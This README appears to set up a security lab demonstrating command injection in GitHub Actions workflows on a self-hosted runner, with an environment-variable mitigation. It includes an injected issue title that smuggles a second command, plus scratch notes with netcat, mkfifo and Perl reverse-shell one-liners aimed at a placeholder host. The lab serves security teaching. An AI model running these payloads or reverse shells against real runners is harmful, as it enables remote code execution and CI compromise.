# GitHub Actions Lab

Note:
>This lab is a demonstration of the need for input validation and sanitization in GitHub Worflows through practical exampls. It is **NOT** a demonstration of how to exploit vulnerable GitHub Workflows.
Lab consists of a docker GitHub runner and a docker exploit Linux host.

## Lab Infrastructure

The lab is made up of several entities:

- Vulnerable GitHub Action Workflows
  - [basic_command_injection.yaml](workflows/basic_command_injection.yaml)
  - [advanced_command_injection.yaml](workflows/advanced_command_injection.yaml)
- A GitHub Action Self-hosted runner (Docker container)
- A Linux host Docker container connected to the same network as the Self-hosted runner

### Setup GitHub Vulnerable Workflows

Note:
>This is demonstration purposes - to demonstrate the importance of deploying advanced security practices with GitHub Actions wokflows. Do not deploy or test these workflows in a corporate network and do not run any of the command inject examples against GitHub hosted runners.

Using a suitable private repository, add the above mentioned GitHub workflow files into `.github/workflows/` directory.

If you don't know how to do that then now is a good time to brush up on your `git` knowledge.

Note that both workflows are configured to use self-hosted runners: `runs-on: [self-hosted, linux, x64]`

### Build Lab Linux images

To build the lab cd into `docker-github` directory and run `$> docker compose build`.

### Start Docker containers

#### GitHub Runner

The GitHub runner requires the following environment variables:

- `GITHUB_TOKEN` - GitHub Personal Access Token with repo level privileges
- `GITHUB_ACTION_RUNNER_TOKEN` - Token provided by GitHub when configuring the self hosted runner

**GITHUB_TOKEN**

Follow these instructions if you're not familiar with [how to create a GitHub Personal Access Token](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token).

`$> export GITHUB_TOKEN=<your-github-access-token>`

**GITHUB_ACTION_RUNNER_TOKEN**

If you're not familiar with setting up GitHub Actions self-hosted runner, follow these instructions: [adding-self-hosted-runners](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners)

All you're interested in here is to extracting the token from the setup page (see instructions above). Find the section **configure** and copy the token from this command: `$ ./config.cmd --url https://github.com/mdtetlow/github_action_playground --token <REDACTED_TOKEN>`

`$> export GITHUB_ACTION_RUNNER_TOKEN=<COPIED_TOKEN>`

Start the GitHub self-hosted runner container: `$> docker compose run gh_runner`.

#### Exploit Linux Host

This container is only needed you want to experiment with the reverse-shell example.

Start the exploit Linux Docker container with command `docker compose run -i exploit`. This will provide you with an interactive shell.

**Docker Network**

Both containers attach to the `gh_runner_net` Docker network in `172.18` subnet and they are assigned unique IP Addresses to make it easier to communicate with the containers in the experiments.

## Objective

Cover the following topics:

- Command Injection
  - Vulnerability explaination
  - Basic
  - Advanced (remote shell on local hosted runner
- Secrets Exfiltration
- Committing malicious code
- Mitigations

## Command Injection

Command Injection exists where `${{}}` macros are included in `run` steps. This is because the macro is expanded (interpolated) blindly and therefore it may be possible to inject arbitrary code.

This is compounded by `GITHUB_TOKEN` which is created for each event - by default this token will have read/write permissions meaning it may also be possible to commit code in the attack.

### Basic Injection

**Vulnerability**

GitHub macro expansion is too flexible by default allowing a threat actor to inject code via macro expansion.

In this case we pass a string with a closing double quote and then pipe another command in the shell.

**Objective**

Run the `ls` command on the GitHub runner

**Method**

In GitHub web console, raise an issue with the following title

```shell
new issue title" && ls / && echo "
```

**Mitigation**

Sanitise the input using environment variables

```yaml
    env:
      TITLE: ${{github.event.issue.title}}
    
    run: |
      echo "ISSUE TITLE: $TITLE"
```

After macro expansion, **issue title** will be converted to `echo "new issue title" && ls / && echo ""`

## Scratch notes

Netcat listener command: `nc -l <PORT>`

Netcat reverse shell command: `nc -e /bin/sh <HOST> <PORT>`

If Netcat is new and doesn't support `-e` then try following alternatives

`mkfifo /tmp/p; nc <HOST> <PORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`

`perl -e 'use Socket;$i="<HOST>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

## References

- [GitHub Actions Security Vulnerability Blog](https://cycode.com/blog/github-actions-vulnerabilities/)
- [Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Docker GitHub Runner](https://dev.to/pwd9000/create-a-docker-based-self-hosted-github-runner-linux-container-48dh)
